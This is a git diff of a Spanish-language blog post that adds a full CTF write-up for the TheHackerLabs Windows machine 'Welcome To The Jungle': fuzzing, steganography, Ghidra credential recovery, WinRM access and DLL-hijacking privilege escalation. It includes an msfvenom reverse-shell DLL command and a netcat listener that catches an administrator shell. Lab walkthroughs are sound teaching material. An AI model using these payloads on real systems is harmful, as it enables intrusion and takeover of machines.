@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Welcome To The Jungle - TheHackerLabs
-excerpt: "."
-date: 2026-02-19
+excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos una página web activa en el puerto 80, en donde encontraremos un mensaje oculto dentro de una de sus subpáginas, siendo el mensaje un posible usuario y, después de aplicarle Fuzzing, descubrimos un archivo ZIP que contiene algunos archivos de texto y un archivo WAV que es un audio. Analizando el archivo WAV, descubrimos que se aplicó esteganografía y logramos obtener un archivo oculto que contiene una ruta web y una contraseña. Nos dirigimos a la ruta y resulta ser un login, al que logramos entrar usando el usuario que encontramos y la contraseña que obtuvimos. En el dashboard, nos permite descargar un archivo que es un binario. Analizamos este binario con Ghidra y descubrimos unas credenciales que nos dan acceso a la máquina víctima vía WinRM. Después de conectarnos a la máquina usando Evil-WinrM, utilizamos winPEASx64 para descubrir alguna vulnerabilidad que nos permita escalar privilegios. Gracias a esto, descubrimos una ruta privilegiada que contiene un binario, que al analizarlo con Ghidra, descubrimos que necesita un archivo DLL para funcionar. Sabiendo esto, creamos un archivo DLL malicioso y lo cargamos a la máquina víctima en la misma ruta donde encontramos el binario, siendo solo cuestión de esperar para obtener una sesión del administrador, logrando escalar privilegios aplicando el ataque DLL Hijacking."
+date: 2026-02-22
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-WelcomeToTheJungle/wlcometothejungle.png
@@ -13,21 +13,51 @@ categories:
   - Medium Machine
 tags:
   - Windows
-  - 
-  - 
+  - SMB
+  - WinRM
+  - Web Enumeration
+  - Fuzzing
+  - Steganography
+  - Steganalysis
+  - Binary Analysis (Ghidra)
+  - System Recognition (Windows)
+  - DLL Hijacking
+  - Privesc - DLL Hijacking
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-WelcomeToTheJungle/wlcometothejungle.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/wlcometothejungle.png">
+</p>
 
-texto
+Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos una página web activa en el **puerto 80**, en donde encontraremos un mensaje oculto dentro de una 
+de sus subpáginas, siendo el mensaje un posible usuario y, después de aplicarle **Fuzzing**, descubrimos un **archivo ZIP** que contiene algunos archivos de texto y un **archivo 
+WAV** que es un audio. Analizando el **archivo WAV**, descubrimos que se aplicó **esteganografía** y logramos obtener un archivo oculto que contiene una ruta web y una contraseña. 
+Nos dirigimos a la ruta y resulta ser un login, al que logramos entrar usando el usuario que encontramos y la contraseña que obtuvimos. En el dashboard, nos permite descargar un 
+archivo que es un binario. Analizamos este binario con **Ghidra** y descubrimos unas credenciales que nos dan acceso a la máquina víctima vía **WinRM**. Después de conectarnos a la 
+máquina usando **Evil-WinrM**, utilizamos **winPEASx64** para descubrir alguna vulnerabilidad que nos permita escalar privilegios. Gracias a esto, descubrimos una ruta privilegiada 
+que contiene un binario, que al analizarlo con **Ghidra**, descubrimos que necesita un archivo DLL para funcionar. Sabiendo esto, creamos un archivo DLL malicioso y lo cargamos a la 
+máquina víctima en la misma ruta donde encontramos el binario, siendo solo cuestión de esperar para obtener una sesión del administrador, logrando escalar privilegios aplicando el 
+ataque DLL Hijacking.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *arp-scan*
+* *Wappalizer*
+* *ffuf*
+* *gobuster*
+* *unzip*
+* *file*
+* *stegseek*
+* *ghidra*
+* *strings*
+* *grep*
+* *nxc*
+* *evil-winrm*
+* *winPEASx64*
+* *msfvenom*
+* *rlwrap*
+* *nc*
 
 
 <br>
@@ -37,23 +67,24 @@ Herramientas utilizadas:
 	<ul>
 		<li><a href="#Recopilacion">Recopilación de Información</a></li>
 			<ul>
+				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#Steganography">Identificando Esteganografia en Archivos Obtenidos de Archivo ZIP</a></li>
+				<li><a href="#Binario">Analizando Binario commonlink.exe y Ganando Acceso a la Máquina Víctima Vía WinRM</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#DLLhijacking">Aplicando DLL Hijacking para Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -182,7 +213,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.06 seconds
 
 <br>
 
-Vemos varios puertos abiertos, pero me da curiosidad el **puerto 80** que nos indica que hay una página web activa.
+Vemos varios puertos abiertos, pero me da curiosidad el **puerto 80**, que nos indica que hay una página web activa.
 
 <br>
 
@@ -243,10 +274,10 @@ Nmap done: 1 IP address (1 host up) scanned in 60.44 seconds
 <br>
 
 Analizando el escaneo de servicios, vemos un par de cosas interesantes:
-* La página web activa en el **puerto 80**, no tiene un dominio asignado.
+* La página web activa en el **puerto 80** no tiene un dominio asignado.
 * Necesitaremos credenciales válidas para ver el **servicio SMB**, aunque por el mensaje de **"Message signing enables but not required"** nos puede permitir hacer **NTLM** o un **SMB Relay Attack**.
 
-Por el momento, enfoquemonos en la página web, así que vamos a analizarla.
+Por el momento, enfoquémonos en la página web, así que vamos a analizarla.
 
 
 <br>
@@ -266,7 +297,7 @@ Entremos:
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura1.png">
 </p>
 
-Parecer ser una página dedicada a un grupo musical.
+Parece ser una página dedicada a un grupo musical.
 
 Veamos qué nos dice **Wappalizer**:
 
@@ -282,13 +313,13 @@ Si observas en la parte superior derecha, podemos visitar una subpágina llamada
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura3.png">
 </p>
 
-Pero al revisar el código fuente, podemos ver un mensaje que dejo alguien y mencionan un nombre:
+Pero al revisar el código fuente, podemos ver un mensaje que dejó alguien y mencionan un nombre:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura4.png">
 </p>
 
-Podríamos aplicarle **Fuerza Bruta** para ver si pertecene a algún servicio de la máquina víctima, pero esto no nos llevara a nada.
+Podríamos aplicarle **Fuerza Bruta** para ver si pertenece a algún servicio de la máquina víctima, pero esto no nos llevará a nada.
 
 Apliquemos **Fuzzing** para saber si hay algún directorio o archivo oculto.
 
@@ -296,7 +327,7 @@ Apliquemos **Fuzzing** para saber si hay algún directorio o archivo oculto.
 
 <h2 id="fuzz">Fuzzing</h2>
 
-Al ver que se utiliza **PHP**, podemos enfocar una busqueda por esa extensión y algunas más.
+Al ver que se utiliza **PHP**, podemos enfocar una búsqueda por esa extensión y algunas más.
 
 Primero utilizaremos la herramienta **ffuf**:
 ```bash
@@ -415,7 +446,7 @@ Finished
 
 <br>
 
-No encontramos gran cosa, pero si vemos un directorio que se llama `/media`.
+No encontramos gran cosa, pero sí vemos un directorio que se llama `/media`.
 
 Probemos si hay algún archivo oculto, pero aparte de usar las extensiones que usamos al inicio, agreguemos algunas más:
 ```bash
@@ -459,7 +490,7 @@ Songs.zip               [Status: 200, Size: 3918, Words: 23, Lines: 11, Duration
 
 Excelente, encontramos un **archivo ZIP** que podemos descargar.
 
-Descargalo y descomprimelo:
+Descárgalo y descomprímelo:
 ```bash
 unzip songs.zip
 Archive:  songs.zip
@@ -502,24 +533,26 @@ The jungle echoes with a sound...
 There's always one password we’ve used since the first rehearsal...
 ```
 
-Trate de escuchar el **archivo WAV** utilizando **Audicity**, pero parece que no contiene ningún audio:
+Traté de escuchar el **archivo WAV** utilizando **Audicity**, pero parece que no contiene ningún audio:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura5.png">
 </p>
 
-Quizá tenga algún espectograma oculto, pero como no hay audio como tal, no veremos nada:
+Quizá tenga algún **espectrograma** oculto, pero como no hay audio como tal, no veremos nada:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura6.png">
 </p>
 
-Viendo la información del archivo, si encontramos la palabra data, puede que contenga un mensaje o archivo oculto:
+Viendo la información del archivo, si encontramos la palabra **data**, puede que contenga un mensaje o archivo oculto:
 ```bash
 file solo_final.wav
 solo_final.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
 ```
-Ahí esta **data**, hay una gran posibilidad de que se haya usado Esteganografía para ocultar algo en este archivo.
+Ahí esta **data**.
+
+Hay una gran posibilidad de que se haya usado **Esteganografía** para ocultar algo en este archivo.
 
 Probemos si la herramienta **stegseek** puede encontrar algo:
 ```bash
@@ -529,9 +562,9 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Progress: 99.26% (132.5 MB)           
 [!] error: Could not find a valid passphrase
 ```
-Parece que si hay algo, pero necesita una contraseña.
+Parece que sí hay algo, pero necesita una contraseña.
 
-Trate de utilizar **rockyou.txt**, pero no encontro nada, así que es muy probable que utilice alguna palabra que este dentro de la página web.
+Traté de utilizar **rockyou.txt**, pero no encontró nada, así que es muy probable que utilice alguna palabra que esté dentro de la página web.
 
 Este wordlist contiene palabras que pueden ser una contraseña:
 ```bash
@@ -565,9 +598,9 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Original filename: "password.txt".
 [i] Extracting to "solo_final.wav.out".
 ```
-Excelente, obtumos un archivo de texto.
+Excelente, obtuvimos un archivo de texto.
 
-Leamoslo:
+Leámoslo:
 ```bash
 cat solo_final.wav.out
 Password:**********
@@ -575,56 +608,128 @@ URL:theh3xgun5
 ```
 Tenemos una página web y una contraseña.
 
-Entremos a esa págna:
+Entremos a esa página:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura7.png">
 </p>
 
-Es un login y para este momento, ya tenemos un usuario y contraseña que podemos utilizar:
+Es un login y, para este momento, ya tenemos un usuario y contraseña que podemos utilizar:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura8.png">
 </p>
 
+Ahí mismo, vemos un botón que dice **Descargar**, que al darle clic, nos descarga un binario:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura9.png">
+</p>
+
+Analicemos el binario.
+
 <br>
 
-<h2 id="Binario">Analizando Binario commonlink.exe</h2>
+<h2 id="Binario">Analizando Binario commonlink.exe y Ganando Acceso a la Máquina Víctima Vía WinRM</h2>
 
+Para analizar este binario, primero veamos que muestra su ejecución, por lo que podemos mandarlo a una **máquina Windows** y ejecutarlo desde ahí:
 
-```bash
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura10.png">
+</p>
 
-```
+Nos está pidiendo una contraseña, pero al darle cualquier texto, el binario se detiene y no muestra nada más (o al menos eso me pasó a mi).
 
-```bash
+Podemos utilizar la herramienta **Ghidra** para analizar este binario; a continuación te explico los pasos.
 
-```
+Abre **Ghidra** en tu máquina y haz lo siguiente:
+* Elige la pestaña **File**
+* Dale a la opción **Create New Project**
+* Elige la opción **Non-Shared Project**
+* Escoge dónde quieres guardar este proyecto y dale un nombre.
 
+Cuando realices todo esto, debe aparecer en el directorio de tu proyecto en el dashboard de **Ghidra**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura11.png">
+</p>
+
+Carguemos el binario que se descargó, eso solamente lo haces dando a la pestaña **File** y dándole a la opción **Import File** para que puedas elegir el binario a cargar. Una vez que 
+lo hagas, el binario aparecerá ahí:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura12.png">
+</p>
+
+Para comenzar el análisis, da doble clic al binario, dale al botón **Yes** (esto porque te pregunta si quieres que analice el binario) y luego al botón **Analyze** (aquí verás algunas 
+opciones a analizar, pero deja las que ya están por defecto).
+
+Una vez que hagas esto, ya podrás ver el binario analizado por **Ghidra** y, curiosamente, vemos la **función main** que contiene información valiosa:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura13.png">
+</p>
+
+Este binario nos acaba de mostrar la contraseña que pide y ahí se ve lo que muestra al darle la contraseña, siendo las credenciales de un usuario.
+
+Igual puedes probarlo con el binario que puedes ejecutar en **Windows**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura14.png">
+</p>
+
+Curiosamente, pudimos saltarnos todo esto si hubiéramos analizado este binario con **strings** y buscando la palabra password con **grep**:
 ```bash
 strings commlink.exe | grep -n "password"
 405:axl password: **********
 ```
 
+Probemos si funcionan esas credenciales con **netexec** para loguearnos vía **WinRM**:
 ```bash
-
+nxc winrm 192.168.100.200 -u 'axl' -p '**********'
+WINRM       192.168.100.200   5985   THEHEXGUNS       [*] Windows Server 2022 Build 20348 (name:THEHEXGUNS) (domain:thehexguns) 
+WINRM       192.168.100.200   5985   THEHEXGUNS       [+] thehexguns\axl:********** (Pwn3d!)
 ```
+Sí funcionan.
 
-```bash
+----
+**IMPORTANTE:**
+Puede que las credenciales que encuentres estén caducadas, por lo que tendrás que loguearte en la máquina víctima y cambiar la contraseña caducada por una nueva.
+Solo así podrás continuar.
 
+----
+
+Probémoslas con **Evil-WinRM**:
+```batch
+evil-winrm -i 192.168.100.200 -u 'axl' -p '**********'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Axl\Desktop> whoami
+thehexguns\ax
 ```
+Estamos dentro.
 
-```bash
+En el directorio **Desktop** encontraremos la flag del usuario:
+```batch
+*Evil-WinRM* PS C:\Users\Axl\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Axl\Desktop> dir
 
+    Directorio: C:\Users\Axl\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/22/2026  10:47 PM           2310 Microsoft Edge.lnk
+-a----         7/27/2025   7:16 PM             32 user.txt
+
+*Evil-WinRM* PS C:\Users\Axl\Desktop> type user.txt
+...
 ```
-
-```bash
-
-```
-
-```bash
-
-```
-
 
 
 <br>
@@ -636,25 +741,185 @@ strings commlink.exe | grep -n "password"
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="DLLhijacking">Aplicando DLL Hijacking para Escalar Privilegios</h2>
 
-```bash
+Al estar dentro, podemos ejecutar la herramienta **winPEASx64** para saber a qué es vulnerable la máquina.
 
+Puedes descargarlo desde aquí:
+* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>
+
+Una vez que lo descargues, puedes cargarlo a tu sesión de **Evil-WinRM** usando el comando **upload** y el nombre del archivo a cargar:
+```batch
+*Evil-WinRM* PS C:\Users\Axl\Desktop> upload winPEASx64.exe
+                                        
+Info: Uploading /../TheHackersLabs/WelcomeToTheJungle/content/winPEASx64.exe to C:\Users\Axl\Desktop\winPEASx64.exe
+                                        
+Data: 13561172 bytes of 13561172 bytes copied
+                                        
+Info: Upload successful!
 ```
 
-```bash
-
+Ya cargado, solamente lo ejecutamos:
+```batch
+*Evil-WinRM* PS C:\Users\Axl\Desktop> .\winPEASx64.exe
 ```
 
-```bash
+Analizando el resultado, vemos una ruta en la sección `Installed Applications --Via Program Files/Uninstall registry--`:
+```batch
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
+È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
+    C:\Program Files\Archivos comunes
+    C:\Program Files\Common Files
+    C:\Program Files\desktop.ini
+    C:\Program Files\dotnet
+    C:\Program Files\HexGuns(Users [Allow: WriteData/CreateFiles])
+...
+```
+El simple hecho de tener esos permisos en ese directorio ya es un indicativo de escalada, por eso te lo mostrará en color rojo.
 
+Ahí encontraremos los siguientes archivos:
+```batch
+*Evil-WinRM* PS C:\Program Files\HexGuns> dir
+
+
+    Directorio: C:\Program Files\HexGuns
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/27/2025   5:47 PM         113870 setlist_uploader.exe
+-a----         7/27/2025   7:19 PM            108 uploader.log
 ```
 
-```bash
+Y si leemos el archivo **uploader.log**, veremos algo interesante:
+```batch
+*Evil-WinRM* PS C:\Program Files\HexGuns> type uploader.log
+[INFO] Starting uploader...
+[ERROR] Missing dependency: config.dll
+[INFO] Uploader finished with warnings.
+```
+Parece que se necesita el **archivo config.dll** para que funcione el binario que vemos ahí.
 
+Igual podemos descargar ese binario para analizarlo con **Ghidra**, utilizando el comando **download**:
+```batch
+*Evil-WinRM* PS C:\Program Files\HexGuns> download setlist_uploader.exe
+                                        
+Info: Downloading C:\Program Files\HexGuns\setlist_uploader.exe to setlist_uploader.exe
+                                        
+Info: Download successful!
 ```
 
+Sigue el mismo proceso para cargar ese binario que como lo hicimos con el primero que nos encontramos.
 
+Una vez que lo tengas importado, sigue los mismos pasos para ver el binario analizado por **Ghidra**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-WelcomeToTheJungle/Captura15.png">
+</p>
+
+De igual forma, vemos cómo la función **main** y cómo se ejecuta este binario.
+
+Acá lo interesante empieza con la función `LoadLibraryA()`. Expliquemos qué hace esta función:
+
+| **LoadLibraryA** |
+|:----------------:|
+| *La función LoadLibrary es una parte clave de la API de Windows que se utiliza para el enlace dinámico en tiempo de ejecución. Carga una biblioteca de enlace dinámico (DLL) o un archivo ejecutable (.exe) especificado en el espacio de direcciones del proceso de llamada, lo que permite al programa utilizar las funciones y los recursos de ese módulo de forma dinámica en tiempo de ejecución. * |
+
+<br>
+
+En resumen, `LoadLibraryA()` es una función de la **API de Windows** que carga una **DLL** en memoria dentro del proceso actual.
+
+Esto nos indica que es posible aplicar el ataque **DLL Hijacking**:
+
+| **DLL Hijacking** |
+|:-----------------:|
+| *DLL Hijacking es una técnica donde un atacante coloca una DLL maliciosa en una ubicación que será cargada por una aplicación legítima, aprovechando el orden en que Windows busca las DLL. Si Windows no encuentra primero la DLL legítima, puede cargar la tuya.* |
+
+<br>
+
+Te dejo un blog que explica cómo funciona este ataque:
+* <a href="https://itm4n.github.io/windows-dll-hijacking-clarified/" target="_blank">Windows DLL Hijacking (Hopefully) Clarified</a>
+
+Y también te comparto este blog que usaremos cómo referencia, ya que aquí nos dan un ejemplo de como aplicarlo:
+* <a href="https://pentestlab.blog/2017/03/27/dll-hijacking/" target="_blank">Pentestlab: DLL Hijacking</a>
+
+Primero, crearemos un **archivo DLL** malicioso con **msfvenom**:
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f dll -o config.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: config.dll
+```
+
+Carga ese archivo a la misma ruta donde se encuentra el binario:
+```batch
+*Evil-WinRM* PS C:\Program Files\HexGuns> upload config.dll
+                                        
+Info: Uploading /../TheHackersLabs/WelcomeToTheJungle/content/config.dll to C:\Program Files\HexGuns\config.dll
+                                        
+Data: 12288 bytes of 12288 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Program Files\HexGuns> dir
+
+
+    Directorio: C:\Program Files\HexGuns
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/22/2026  11:26 PM           9216 config.dll
+-a----         7/27/2025   5:47 PM         113870 setlist_uploader.exe
+-a----         7/27/2025   7:19 PM            108 uploader.log
+```
+
+Abre un listener usando **rlwrap** y luego **netcat**:
+```bash
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+```
+Ahora puede hacer dos cosas, esperar a que llegue la sesión al listener o reiniciar la máquina víctima.
+
+Observa la **netcat**:
+```batch
+rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.100.200] 49715
+Microsoft Windows [Version 10.0.20348.587]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+thehexguns\administrador
+```
+Somos el **Administrador**.
+
+Esto funcionó porque quien está ejecutando este binario es el **Administrador** de la máquina víctima:
+```batch
+C:\Windows\system32>schtasks /query /fo LIST /v | findstr /i HexGuns
+schtasks /query /fo LIST /v | findstr /i HexGuns
+HostName:                             THEHEXGUNS
+HostName:                             THEHEXGUNS
+HostName:                             THEHEXGUNS
+HostName:                             THEHEXGUNS
+Author:                               THEHEXGUNS\Administrador
+Task To Run:                          "C:\Program Files\HexGuns\setlist_uploader.exe"
+...
+```
+Esta comprobación no se pudo hacer en **Evil-Winrm** porque nos pedía privilegios elevados.
+
+Ya solamente obtengamos la última flag:
+```batch
+C:\Windows\system32>cd C:\Users\Administrador\Desktop
+cd C:\Users\Administrador\Desktop
+C:\Users\Administrador\Desktop>type root.txt
+type root.txt
+...
+```
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -664,10 +929,13 @@ strings commlink.exe | grep -n "password"
 </div>
 
 
-links
+* https://github.com/peass-ng/PEASS-ng
+* https://itm4n.github.io/windows-dll-hijacking-clarified/
+* https://pentestlab.blog/2017/03/27/dll-hijacking/
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
